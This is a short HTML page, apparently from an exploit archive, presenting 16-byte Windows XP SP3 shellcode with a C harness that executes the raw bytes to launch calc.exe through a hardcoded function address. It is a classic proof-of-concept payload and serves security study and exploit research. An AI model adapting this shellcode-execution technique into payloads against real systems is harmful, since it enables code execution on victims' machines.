<html><head><title>Windows - XP SP3 EN Calc Shellcode - 16 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*------------------------------------------------------------------------
  Title...................Windows XP SP3 EN Calc Shellcode 16 Bytes
  Release Date............12/7/2010
  Tested On...............Windows XP SP3 EN
  ------------------------------------------------------------------------
  Author..................John Leitch
  Site....................http://www.johnleitch.net/
  Email...................john.leitch5@gmail.com
  ------------------------------------------------------------------------*/

int main(int argc, char *argv[])
{
    char shellcode[] =         
        &quot;\x31\xC9&quot;                // xor ecx,ecx        
        &quot;\x51&quot;                    // push ecx        
        &quot;\x68\x63\x61\x6C\x63&quot;    // push 0x636c6163        
        &quot;\x54&quot;                    // push dword ptr esp        
        &quot;\xB8\xC7\x93\xC2\x77&quot;    // mov eax,0x77c293c7        
        &quot;\xFF\xD0&quot;;               // call eax         
 
    ((void(*)())shellcode)();
 
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
